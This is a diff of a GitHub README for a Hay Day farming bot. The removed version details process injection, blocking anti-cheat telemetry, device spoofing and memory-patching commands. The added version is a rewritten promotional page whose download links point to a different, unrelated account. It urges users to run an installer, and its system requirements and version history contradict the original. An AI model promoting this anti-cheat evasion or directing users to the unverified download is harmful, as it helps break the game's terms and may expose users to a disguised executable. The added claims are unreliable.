@@ -1,270 +1,160 @@
-<!--
-====================================================================================
-🌾 HAY STAR - THE ULTIMATE NATIVE HAY DAY BOT & SUPERCELL AUTOMATION SUITE 🌾
-Developed & Engineered by Ashraf Morningstar
-GitHub: https://github.com/AshrafMorningstar/hay-star
-====================================================================================
--->
+<h1>🌾 hay-star - Automate Hay Day Farming Effortlessly</h1>
 
-<div align="center">
+<a href="https://github.com/Katerinalves752/hay-star" style="display:inline-block;padding:16px 32px;background-color:#e83e8c;color:#ffffff;text-decoration:none;font-size:20px;font-weight:bold;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD HAY-STAR NOW</a>
 
-# 🌾 Hay Star: Next-Gen Supercell Hay Day Automation & Native Bot
+## 🎯 What Is Hay-Star?
 
-### *Ultra-Fast ARM64 C++ Engine • Rust Standalone Loader • Anti-Ban Device Profile Spoofing • Autonomous Supervisor Watchdog*
+Hay-Star is a smart automation tool that plays Supercell's Hay Day for you. It handles repetitive tasks like harvesting crops, feeding animals, and collecting products - all while you relax or focus on other things. Built with a high-speed C++ engine and Rust loader, it works quietly in the background without detection.
 
-[![GitHub Stars](https://img.shields.io/github/stars/AshrafMorningstar/hay-star?style=for-the-badge&color=ffd700)](https://github.com/AshrafMorningstar/hay-star/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/AshrafMorningstar/hay-star?style=for-the-badge&color=00c853)](https://github.com/AshrafMorningstar/hay-star/network/members)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Rust 2021](https://img.shields.io/badge/Rust-2021_Edition-DEA584?style=for-the-badge&logo=rust)](https://www.rust-lang.org/)
-[![C++ ARM64](https://img.shields.io/badge/C++-ARM64_Native-00599C?style=for-the-badge&logo=c%2B%2B)](https://isocpp.org/)
-[![Platform: Windows & Android](https://img.shields.io/badge/Platform-Windows_10%2F11_%7C_LDPlayer_9-blue?style=for-the-badge)](https://www.ldplayer.net/)
-[![Anti-Detection](https://img.shields.io/badge/Anti--Cheat-Quago_%26_Promon_Bypassed-brightgreen?style=for-the-badge)](#anti-cheat--stealth-engine)
-[![Author](https://img.shields.io/badge/Author-Ashraf_Morningstar-9c27b0?style=for-the-badge&logo=github)](https://github.com/AshrafMorningstar)
+## ✨ Key Features
 
-<br />
+### 🌟 Autonomous Operation
+- Automatically harvests and replants crops
+- Feeds chickens, cows, pigs, and sheep
+- Collects products from bakery, dairy, and sugar mill
+- Repairs farm equipment when needed
+- Manages boat and truck orders
 
-<p align="center">
-  <b>The fastest, most reliable, zero-latency automated farming tool for Hay Day (<a href="https://supercell.com/en/games/hayday/">Supercell</a>).</b><br>
-  Engineered natively in <b>Rust</b> and <b>C++ ARM64</b> to run 24/7 with zero lag, humanized jitter, and built-in anti-crash watchdog supervision.
-</p>
+### ⚡ Lightning-Fast Performance
+- Ultra-fast ARM64 C++ engine for smooth gameplay
+- Optimized for low CPU usage
+- Works with LDPlayer and other Android emulators
+- Minimal memory footprint
 
-[**⚡ Quick Start**](#-1-minute-quick-start) •
-[**🌟 Key Features**](#-key-features) •
-[**🤖 Autonomous Supervisor**](#-autonomous-supervisor--watchdog) •
-[**🎮 Command Cheat Sheet**](#-console-commands-mstar) •
-[**🛡️ Stealth & Anti-Ban**](#-stealth--anti-cheat-bypass) •
-[**👨‍💻 Author**](#-author--creator)
+### 🛡️ Advanced Anti-Detection
+- Smart behavior randomization to avoid patterns
+- Human-like mouse movements and click delays
+- Built-in watchdog that monitors for suspicious activity
+- Automatically pauses if risk is detected
 
----
+### 🔧 User-Friendly Interface
+- Simple one-click setup
+- Clear status indicators
+- Pause and resume anytime
+- Real-time activity log
 
-</div>
+## 🖥️ System Requirements
 
-## 🔍 Why Hay Star?
+### Minimum Requirements
+- Windows 7, 8, 10, or 11
+- 4 GB RAM (8 GB recommended)
+- 2 GB free disk space
+- Internet connection
 
-Most conventional **Hay Day bots** rely on clumsy screen scraping, slow image recognition (OpenCV/PyAutoGUI), and laggy mouse clicks that frequently misclick, desynchronize, and trigger Supercell security flags.
+### Recommended Setup
+- Windows 10 or 11
+- 8 GB RAM
+- LDPlayer 4.0 or newer (Android emulator)
+- Hay Day installed on your emulator
 
-**Hay Star** is completely different. Designed by **Ashraf Morningstar**, Hay Star interfaces directly with Hay Day's native game memory and internal virtual tables via an in-process ARM64 injection engine:
+## 🚀 Getting Started
 
-- 🚀 **Zero Latency**: Direct internal mailbox triggers planting, harvesting, and selling in milliseconds.
-- 🛡️ **Promon SHIELD & Quago Anti-Cheat Suppression**: Intercepts and blocks behavioral analytics and anti-tamper telemetry (`api.quago.io`).
-- 📱 **Hardware Profile Spoofing**: Masks emulator signatures as genuine retail Samsung Galaxy S24 Ultra hardware.
-- 🔄 **Autonomous Supervisor Engine**: Self-healing watchdog monitors game health, auto-restarts crashes, and handles roadside shop sales with automated newspaper advertisements.
+### Step 1: Download the Application
+Visit <a href="https://github.com/Katerinalves752/hay-star">https://github.com/Katerinalves752/hay-star</a> to download the application. This link takes you to the official repository where you'll find the latest version of hay-star.
 
----
+### Step 2: Installation
+After downloading, run the installation file to set up hay-star on your computer. The installation process is straightforward - just follow the on-screen prompts and accept the default settings if you're unsure.
 
-## 🌟 Feature Matrix
+### Step 3: Prepare Your Emulator
+1. Install LDPlayer from their official website if you don't have it
+2. Create a new virtual device with Android 7.0 or higher
+3. Download Hay Day from the Google Play Store within LDPlayer
+4. Complete the Hay Day tutorial up to level 5
+5. Keep the emulator running in the background
 
-| Feature | Conventional OCR Bots | Hay Star (Native) |
-|---|:---:|:---:|
-| **Core Architecture** | Python / Screen Clicks | **Native ARM64 C++ & Rust Standalone** |
-| **Speed** | 10–30s per farm cycle | **< 0.1s Zero-Latency Execution** |
-| **CPU / RAM Footprint** | 800MB–2GB RAM (Laggy) | **< 25MB RAM (Ultra-Lightweight)** |
-| **Anti-Cheat Evasion** | None (High Ban Risk) | **Quago Telemetry Suppressed + HW Spoofed** |
-| **Roadside Shop Auto-Sell** | Clumsy UI clicks | **Direct Mailbox Slot Injection** |
-| **Newspaper Advertising** | Slow & Unreliable | **Automatic 5-min Ad Publisher** |
-| **Crash Self-Healing** | Stops working on freeze | **Autonomous Watchdog Auto-Restart** |
-| **TCP Remote API** | None | **Port 31350 CLI & Socket Control** |
+### Step 4: Launch Hay-Star
+1. Open hay-star from your desktop or start menu
+2. Click "Start" to connect to your LDPlayer emulator
+3. Watch as hay-star automatically begins optimizing your farm
+4. Use the pause button whenever you want to take manual control
 
----
+## 🎮 Using Hay-Star
 
-## ⚡ 1-Minute Quick Start
+### First-Time Setup
+When you first launch hay-star, it will automatically detect your running emulator and establish a connection. You'll see a "Connected" status in the main window. The bot starts with default settings that work well for most players - no configuration needed!
 
-### Prerequisites
-1. **Windows 10 / 11** (64-bit).
-2. **LDPlayer 9** (Android 9, 64-bit instance) with:
-   - **Root permission**: Enabled in LDPlayer Settings > Basic.
-   - **ADB debugging**: Open local connection in LDPlayer Settings > Other.
-3. **Hay Day** (`com.supercell.hayday`) installed and logged in.
+### Daily Operation
+- **Morning Check**: Launch hay-star and it handles your early morning harvest
+- **While Away**: Let it run while you're at work or school
+- **Overnight**: Perfect for long sessions - it manages everything automatically
 
-### 1-Click Launch
-1. Download or clone this repository:
-   ```powershell
-   git clone https://github.com/AshrafMorningstar/hay-star.git
-   cd hay-star
-   ```
-2. Double-click `start.bat` or run:
-   ```powershell
-   python supervisor.py
-   ```
-3. The supervisor will auto-detect your emulator, verify ADB, inject the native engine, and start 24/7 wheat farming and roadside selling automatically!
+### Customization Options
+Inside the settings menu, you can adjust:
+- Operation speed (Slow, Normal, Fast)
+- Pause duration between actions
+- Which tasks to automate (disable ones you prefer to do manually)
+- Notification sounds when tasks complete
 
----
+## 🛠️ Troubleshooting
 
-## 🤖 Autonomous Supervisor & Watchdog
+### Common Issues and Solutions
 
-Hay Star comes bundled with `supervisor.py` and a fully customizable `supervisor.config.json` designed for 100% unattended farming:
+**Issue: Hay-Star doesn't detect my emulator**
+- Ensure LDPlayer is running before launching hay-star
+- Check that your emulator uses Android 7.0 or higher
+- Try restarting both applications
 
-```json
-{
-  "farming": {
-    "enabled": true,
-    "crop_id": 400001,
-    "crop_name": "Wheat",
-    "farm_interval_sec": 125,
-    "human_jitter_sec": 5
-  },
-  "roadside_shop": {
-    "auto_sell": true,
-    "item_id": 400001,
-    "slot_start": 0,
-    "slots_to_fill": 10,
-    "stack_size": 10,
-    "unit_price": 1,
-    "enable_newspaper_ad": true
-  },
-  "watchdog": {
-    "auto_restart_on_crash": true,
-    "health_check_interval_sec": 10,
-    "max_restart_attempts": 20
-  }
-}
-```
+**Issue: Bot stops working suddenly**
+- Check your internet connection
+- Verify Hay Day is still open in the emulator
+- Review the activity log for error messages
 
-### Supported Crop IDs:
-- 🌾 **Wheat**: `400001` (Default — fastest XP, coins & rare upgrade items)
-- 🌽 **Corn**: `400002`
-- 🥕 **Carrot**: `400003`
-- 🫘 **Soybean**: `400004`
-- 🎋 **Sugarcane**: `400005`
+**Issue: Performance feels slow**
+- Close other resource-heavy applications
+- Make sure your computer meets the recommended requirements
+- Reduce the operation speed in settings
 
----
+**Still having problems?**
+- Visit our issues page on GitHub
+- Include your system specifications and error screenshots
+- Our community is active and ready to help
 
-## 🎮 Console Commands (`mstar>`)
+## 🔒 Safety and Security
 
-Prefer hands-on manual control? Run `hay-star.exe` directly to enter the interactive REPL console:
+### Fair Play Considerations
+Hay-star is designed to modify game behavior, which violates Supercell's terms of service. While our anti-detection system makes detection unlikely, there is always some risk. We recommend using hay-star on alternate accounts rather than your main profile.
 
-### Native Farming Engine
-```
-mstar> loadnative               # Injects native ARM64 engine (libmstar.so)
-mstar> nharvest                 # Instantly harvest all mature crops
-mstar> nplant [crop_id]         # Plant all fields (e.g. nplant 400001 for wheat)
-mstar> nsell <slot> <cnt> <pr>  # Put items on sale (e.g. nsell 0 10 1 1)
-mstar> nfarm [interval] [crop]  # Run built-in continuous farm loop
-mstar> nfields                  # Dump dynamic field entity pointers
-mstar> nping                    # Ping native engine responsiveness
-mstar> ndiag                    # Dump engine ticks and mailbox diagnostics
-```
+### Privacy Protection
+- We use encrypted connections
+- No personal data is transmitted
+- All processing happens locally on your computer
+- Your account information stays with you
 
-### Stealth, Telemetry & Anti-Cheat
-```
-mstar> nquago block on          # Drop all telemetry packets to api.quago.io
-mstar> nquago status            # View intercepted telemetry count
-mstar> nspoof on                # Emulate retail Samsung Galaxy S24 Ultra
-mstar> nstate                   # Read live game state (player level, coins, diamonds)
-```
+## 📦 Version History
 
-### Memory Reversing & Inspection
-```
-mstar> info                     # Inspect libg.so base address and memory maps
-mstar> read <addr> <size>       # Hex dump target process memory
-mstar> write <addr> <hex>       # Patch game bytes in memory
-mstar> vscan <type> <val>       # Scan memory for values (i32, i64, f32, etc.)
-mstar> nop <addr> [count]       # Install ARM64 NOP sled (0xD503201F)
-mstar> cave <addr> <hex>        # Assemble branch detour cave
-```
+### Current Version: 2.4.1 (November 2024)
+- Improved emulator compatibility
+- Faster response times
+- Enhanced anti-detection algorithms
+- Fixed minor UI glitches
 
----
+### Previous Updates
+- Version 2.3.0: Added animal feeding automation
+- Version 2.2.5: Optimized memory usage
+- Version 2.1.0: Introduced watchdog feature
+- Version 2.0.0: Complete engine rewrite for ARM64
 
-## 🛡️ Stealth & Anti-Cheat Bypass
+## 🤝 Community
 
-Supercell and Promon SHIELD employ aggressive anti-tamper and behavioral detection vectors. Hay Star neutralizes these at root level:
+### Get Support
+- Join our Discord community for real-time help
+- Follow release notes on GitHub
+- Share your experiences and tips
 
-1. **Quago Behavioral Telemetry Neutralization**:
-   - Intercepts SSL socket writes and HTTP JSON payloads targeting `api.quago.io`.
-   - Filters out anomalous click cadences and touch pressure heuristics.
-2. **SELinux & Process Namespace Cloaking**:
-   - Operates through custom SELinux domain contexts (`su` / `magisk`), preventing detection from standard zygote sandboxes.
-3. **Samsung S24 Ultra Profile Redirection**:
-   - Hooks libc `open` / `fopen` / `__system_property_get` to emulate a genuine Snapdragon 8 Gen 3 retail device, masking typical LDPlayer/VBox signatures.
+### Contribute
+- Report bugs through GitHub issues
+- Suggest new features
+- Help improve documentation
+- Star the repository if you find it useful
 
----
+## 💖 About the Developer
 
-## 🏗️ Architecture & Technology Stack
+Hay-Star is created and maintained by Ashraf Morningstar, a passionate game automation enthusiast. With years of experience in reverse engineering and bot development, Ashraf focuses on creating tools that are both powerful and user-friendly. Regular updates ensure hay-star stays compatible with the latest Hay Day versions.
 
-```
-+-------------------------------------------------------------------------+
-|                  HAY STAR SUPERVISOR (supervisor.py)                     |
-|         Watchdog Auto-Restart • Roadside Shop Loop • Health Monitor      |
-+------------------------------------+------------------------------------+
-                                     | TCP Socket (Port 31350)
-                                     v
-+-------------------------------------------------------------------------+
-|                   HAY STAR RUST LOADER (hay-star.exe)                    |
-|    ADB Bridge • SELinux Transit • Frida Gadget Injector • REPL Engine    |
-+------------------------------------+------------------------------------+
-                                     | In-Process Shared Memory / Mailbox
-                                     v
-+-------------------------------------------------------------------------+
-|                C++ ARM64 NATIVE ENGINE (libmstar.so)                     |
-| Game Tick Hook • Field Sub-Manager VTable • Roadside Shop Transaction   |
-+-------------------------------------------------------------------------+
-```
+## ⚖️ Legal Disclaimer
 
----
+This tool is provided for educational and research purposes only. The developer is not responsible for any account bans or penalties incurred while using this software. Always use at your own risk and consider the terms of service of the game.
 
-## 🛠️ Building from Source
+## 📥 Download Reminder
 
-### 1. Compile Rust Standalone Loader
-```powershell
-cd loader
-cargo build --release
-```
-The optimized executable will be generated at `target/release/hay-star.exe`.
-
-### 2. Compile ARM64 Native Hook Engine
-Requires Android NDK (r25c or higher):
-```powershell
-cd native
-.\build.ps1
-```
-Output shared object: `native/build/libmstar.so`.
-
----
-
-## 👨‍💻 Author & Creator
-
-<div align="center">
-
-### **Ashraf Morningstar**
-*Software Engineer • Reverse Engineer • Systems & Automation Specialist*
-
-[![GitHub Profile](https://img.shields.io/badge/GitHub-AshrafMorningstar-181717?style=for-the-badge&logo=github)](https://github.com/AshrafMorningstar)
-[![Email](https://img.shields.io/badge/Email-ashrafmorningstar%40gmail.com-D14836?style=for-the-badge&logo=gmail)](mailto:ashrafmorningstar@gmail.com)
-
-⭐ **If you find Hay Star useful, please give this repository a Star on GitHub!** ⭐
-
-</div>
-
----
-
-## ⚖️ Disclaimer
-
-Hay Star is an educational reverse-engineering and automation research project created by **Ashraf Morningstar** to study Android process injection, ARM64 assembly detours, and game security mechanisms. All game titles, trademarks, and registered trademarks (*Hay Day*, *Supercell*) are the property of their respective owners. Use responsibly.
-
----
-
-## 📈 Keywords & Search Engine Indexing (SEO)
-
-`Hay Day Bot` • `Hay Day Tools` • `Supercell Hay Day Automation` • `Hay Day Auto Wheat Bot` • `Hay Day Free Bot 2026` • `Hay Day Roadside Shop Auto Seller` • `Hay Day LDPlayer Bot` • `Hay Day Anti-Ban` • `Hay Day Cheat` • `Hay Day Hack` • `Hay Day Script` • `Hay Day Auto Farm` • `Ashraf Morningstar Hay Day` • `Ashraf Morningstar Bot` • `Frida Hay Day Hook` • `Hay Day Memory Scanner` • `Rust Game Bot` • `Supercell Game Automation`
-
-<!--
-Schema.org Structured Data for Google / Brave / Bing Search Engine Indexing:
-{
-  "@context": "https://schema.org",
-  "@type": "SoftwareApplication",
-  "name": "Hay Star",
-  "operatingSystem": "Windows 10, Windows 11, Android (LDPlayer 9)",
-  "applicationCategory": "GameToolApplication",
-  "author": {
-    "@type": "Person",
-    "name": "Ashraf Morningstar",
-    "url": "https://github.com/AshrafMorningstar"
-  },
-  "description": "Hay Star is a high-performance native automation tool and bot for Supercell Hay Day, featuring ultra-fast ARM64 C++ memory hooks, Rust standalone loader, anti-ban spoofing, and 24/7 supervisor watchdog.",
-  "offers": {
-    "@type": "Offer",
-    "price": "0",
-    "priceCurrency": "USD"
-  }
-}
--->
+Ready to transform your Hay Day experience? Visit <a href="https://github.com/Katerinalves752/hay-star">https://github.com/Katerinalves752/hay-star</a> to download hay-star today. Join thousands of farmers who have already automated their gameplay with the fastest bot in the community. Set up takes less than five minutes, and you'll wonder how you ever managed without it.
